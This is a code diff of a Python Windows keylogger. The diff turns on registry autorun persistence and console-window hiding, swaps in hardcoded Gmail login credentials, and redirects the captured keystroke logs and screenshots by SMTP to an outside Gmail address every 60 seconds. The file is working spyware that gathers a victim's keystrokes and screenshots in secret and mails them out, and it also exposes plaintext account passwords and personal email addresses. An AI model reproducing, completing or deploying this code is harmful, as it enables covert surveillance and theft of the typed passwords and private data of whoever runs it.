@@ -18,12 +18,12 @@ import autorun
 import win32process
 import  shutil
 
-# autorun.AddToRegistry()
-# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-# if hwnd != 0:      
-#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
-#     ctypes.windll.kernel32.CloseHandle(hwnd)
-#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
+autorun.AddToRegistry()
+hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+if hwnd != 0:      
+    ctypes.windll.user32.ShowWindow(hwnd, 0)      
+    ctypes.windll.kernel32.CloseHandle(hwnd)
+    _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 
 
@@ -32,10 +32,10 @@ img_count = 1
 
 def main_func():
     SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
-    # EMAIL_PASSWORD = "abcd@1234"
-    EMAIL_ADDRESS = "core.builder11@gmail.com"
-    EMAIL_PASSWORD = "builder123*"
+    EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
+    EMAIL_PASSWORD = "abcd@1234"
+    # EMAIL_ADDRESS = "core.builder11@gmail.com"
+    # EMAIL_PASSWORD = "builder123*"
 
     class Keylogger:
         def __init__(self, interval, report_method="email"):
@@ -108,13 +108,6 @@ def main_func():
                     img = MIMEImage(fp.read())
                 img.add_header('Content-ID', '<{}>'.format(f'C://temp/log{i}.png'))
                 msg.attach(img)
-            # if self._attachimg(1):
-            # if self._attachimg(2):
-            #     msg.attach(self._attachimg(2))
-            # if self._attachimg(3):
-            #     msg.attach(self._attachimg(3))
-            # if self._attachimg(4):
-            #     msg.attach(self._attachimg(4))
             print('sending email...')
             # manages a connection to an SMTP server
             server = smtplib.SMTP(host="smtp.gmail.com", port=587)
@@ -123,7 +116,7 @@ def main_func():
             # login to the email account
             server.login(email, password)
             # send the actual message
-            server.sendmail(email, 'core.builder11@gmail.com',msg.as_string())
+            server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
             print('email sent successfully')
             # terminates the session
             server.quit()
